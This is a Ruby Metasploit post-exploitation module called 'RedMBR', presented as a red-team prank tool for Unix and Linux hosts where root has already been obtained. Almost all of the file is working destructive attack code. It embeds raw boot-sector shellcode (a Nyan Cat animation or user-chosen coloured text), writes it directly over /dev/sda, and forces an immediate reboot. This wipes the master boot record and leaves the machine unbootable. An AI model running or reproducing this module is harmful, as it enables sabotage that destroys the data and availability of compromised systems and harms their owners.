require 'msf/core'
require 'rex'
require 'msf/core/post/common'
 
class MetasploitModule < Msf::Post
 
 include Msf::Post::Common
 
 def initialize(info={})
     super( update_info( info,
         'Name' => 'RedMBR',
         'Description' => %q{
             A customizable message-based MBR for red teamers. After obtaining root perms on any *nix box, 
             you can set the MBR to a specified string with customizable output colors for foreground and background.
             Additionally, you can also set the MBR to the classic nyanMBR (note that this option overrides any other).
         },
         'License' => MSF_LICENSE,
         'Author' => [
             'Tristan Fletcher #Cyclawps52',
         ],
         'Platform' => [ 'unix', 'linux' ],
         'SessionTypes' => [ 'meterpreter', 'shell' ]
     ))
     register_options(
     [
        OptBool.new('NyanMode', [true, 'True if you want to use the classic NyanMBR instead of a custom one', 'false' ]),
        OptString.new('MBRText', [false, 'The text to display on the MBR', 'Red Team Always Wins ;)']),
        OptString.new('BGColor', [false, 'Background color of MBR in 16-color notation (0-f) <default: red>', '4']),
        OptString.new('FGColor', [false, 'Text color of MBR in 16-color notation (0-f) <default: black>', '0']),
     ], self.class)
 end
 
 # Main method
 def run

    # get variable options
    nyanMode = datastore['NyanMode']
    customText = datastore['MBRText']
    backColor = datastore['BGColor']
    frontColor = datastore['FGColor']

    if nyanMode == true
        # set up nyan payload
        payload = "\\x0e\\x1f\\x0e\\x07\\xfc\\xb9\\x19\\x00\\xbf\\xbb\\x7d\\x0f\\x31\\x96\\x31\\xf0\\xc1\\xc6\\x07\\xab\\xe2"
        payload += "\\xf5\\xb8\\x13\\x00\\xcd\\x10\\x68\\x00\\xa0\\x07\\x6a\\x04\\x06\\xbd\\x80\\x02\\x31\\xff\\xb8\\x7e\\x00"
        payload += "\\x31\\xc9\\x49\\xf3\\xaa\\xbf\\x00\\x50\\xb1\\x05\\x57\\x01\\xef\\xf7\\xdd\\x51\\xb1\\x05\\xb0\\x28\\xbb"
        payload += "\\x18\\x00\\xba\\x0c\\x00\\xe8\\xbb\\x00\\x04\\x04\\xe2\\xf3\\x59\\x5f\\x83\\xc7\\x18\\xe2\\xe2\\x01\\xef"
        payload += "\\x57\\xb1\\x19\\xbb\\xbb\\x7d\\x83\\x2f\\x04\\x8b\\x3f\\x80\\x3f\\x28\\x77\\x0d\\xbe\\xa5\\x7d\\x7a\\x03"
        payload += "\\xbe\\xb0\\x7d\\x53\\xe8\\x7e\\x00\\x5b\\x43\\x43\\xe2\\xe5\\xb1\\x03\\xbf\\x64\\x73\\xbb\\x0c\\x00\\x31"
        payload += "\\xc0\\xe8\\x7e\\x00\\x81\\xc7\\x04\\xf6\\xb0\\x19\\xb2\\x04\\xe8\\x75\\x00\\x81\\xc7\\xf0\\xf5\\x29\\xef"
        payload += "\\x29\\xef\\xe2\\xe3\\x5f\\xbe\\x50\\x7d\\xe8\\x77\\x00\\xe8\\x71\\x00\\x58\\x5a\\xf7\\xd8\\x79\\x04\\xf7"
        payload += "\\xdd\\xf7\\xda\\xf7\\xdd\\x52\\x50\\x29\\xd7\\x81\\xc7\\x2c\\x1e\\xe8\\x5a\\x00\\xb1\\x05\\xe8\\x31\\x00"
        payload += "\\xe2\\xfb\\x81\\xc7\\xb8\\x09\\xe8\\x84\\x00\\x83\\xc7\\x14\\xe8\\x7e\\x00\\x83\\xc7\\x24\\xe8\\x78\\x00"
        payload += "\\x83\\xc7\\x18\\xe8\\x72\\x00\\x99\\x41\\xb4\\x86\\xcd\\x15\\xba\\xda\\x03\\xed\\xa8\\x08\\x74\\xfb\\xed"
        payload += "\\xa8\\x08\\x75\\xfb\\xe9\\x37\\xff\\xac\\x93\\xac\\x92\\xac\\x3c\\x04\\x74\\x1a\\xe8\\x3c\\x00\\x92\\xe8"
        payload += "\\x02\\x00\\xeb\\xf1\\x89\\xda\\x51\\x57\\x89\\xd9\\xf3\\xaa\\x5f\\x81\\xc7\\x40\\x01\\x4a\\x75\\xf3\\x59"
        payload += "\\xc3\\xe8\\x00\\x00\\xac\\xe8\\x1d\\x00\\x57\\x31\\xc0\\xac\\x91\\xac\\x93\\xac\\x92\\xac\\x60\\xe8\\xdb"
        payload += "\\xff\\x61\\x80\\xea\\x08\\x80\\xc3\\x08\\x81\\xc7\\xfc\\x04\\xe2\\xef\\x5f\\xc3\\x30\\xe4\\xc1\\xe0\\x02"
        payload += "\\x01\\xc7\\xc1\\xe8\\x07\\x69\\xc0\\x80\\x04\\x05\\xd8\\xeb\\x01\\xc7\\xc3\\x60\\xe8\\xc4\\xff\\x61\\xc3"
        payload += "\\x6a\\x03\\x48\\x48\\x00\\xaa\\x02\\x48\\x40\\x59\\xac\\x03\\x38\\x38\\x3c\\x8a\\x04\\x28\\x28\\x00\\xaa"
        payload += "\\x03\\x28\\x20\\x19\\x10\\x19\\x28\\x14\\x04\\x08\\x41\\xe1\\x55\\x04\\x08\\x00\\x01\\x51\\x04\\x04\\x0f"
        payload += "\\x43\\x71\\x04\\x04\\x00\\x20\\x4a\\x4a\\x4a\\x4b\\x6b\\x8b\\x8a\\x71\\x4a\\x4b\\x6b\\x8b\\x8a\\x8a\\x8a"
        payload += "\\xc5\\xa6\\x8a\\x6b\\x6b\\x6b\\x6b\\x6b\\x6b\\x4a\\x67\\x04\\x8a\\x02\\x08\\x0c\\x00\\xaa\\x01\\x08\\x04"
        payload += "\\x19\\x04\\x0f\\x8a\\x0a\\x8a\\xa7\\x6b\\x6e\\x6b\\xa7\\x8a\\x04\\x0f\\x2a\\x8c\\xab\\xa9\\x88\\x48\\x29\\x2b\\x04"

        print_status("Linux Nyan Cat selected! Deploying...")
            
        commandToRun = "echo -n -e '" + payload + "' >/dev/sda && shutdown -r now"
        commandOutput = cmd_exec(commandToRun)
        print_status("Command pushed to remote device.")

    else
        # create customMBR binary
        print_status("Custom MBR selected. Parsing options and building payload...")

        payload = "\\x9c\\x66\\x50\\x66\\x52\\xba\\xd4\\x03\\xb0\\x0a\\xee\\x42\\xb0\\x20\\xee\\x66\\x5a\\x66\\x58\\x9d\\x8c\\xc8\\x8e\\xd8\\xba\\x00\\x00\\xb7\\x00\\xb4\\x02\\xcd\\x10\\xb9\\xd0\\x07\\xb7\\x00\\xb3"
        vidByte = "\\x" + backColor + frontColor
        payload += vidByte
        payload += "\\xb0\\x20\\xb4\\x09\\xcd\\x10\\xba\\xbc\\x07\\xb7\\x00\\xb4\\x02\\xcd\\x10\\xbe\\x5a\\x7c\\xe8\\x00\\x00\\x50\\xfc\\x8a\\x04\\x3c\\x00\\x74\\xbb\\xe8\\x03\\x00\\x46\\xeb\\xf4\\xb9\\x0f\\x00\\xba\\x40\\x42\\xb4\\x86\\xcd\\x15\\xb4\\x0e\\xcd\\x10\\xc3"
        
        hexConvert = customText.unpack('U'*customText.length).collect {|customText| customText.to_s 16}.join("\\x")
        
        payload += "\\x" + hexConvert
        payload += "\\x20\\x20\\x20\\x20\\x20\\x0"

        print_status("MBR payload successfully built!")        

        print_status("Deploying to *nix box...")

        commandToRun = "echo -n -e '" + payload + "' >/dev/sda && shutdown -r now"
        commandOutput = cmd_exec(commandToRun)
        print_status("Command pushed to remote device.")
 
    end

 end
 
end